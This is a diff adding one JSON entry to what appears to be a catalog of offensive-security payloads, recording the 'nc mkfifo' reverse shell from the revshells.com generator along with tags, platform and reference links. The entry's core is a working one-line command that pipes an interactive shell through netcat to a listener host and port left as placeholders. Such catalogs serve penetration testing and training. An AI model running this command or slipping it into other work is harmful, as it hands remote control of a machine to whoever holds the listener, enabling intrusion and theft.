@@ -1,0 +1,29 @@
+{
+  "id": "rsg-reverseshell-nc-mkfifo",
+  "name": "RSG · ReverseShell · nc mkfifo",
+  "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<shell> -i 2>&1|nc <lhost> <lport> >/tmp/f",
+  "description": "Reverse Shell payload — nc mkfifo (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "mac"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/nc mkfifo/5",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
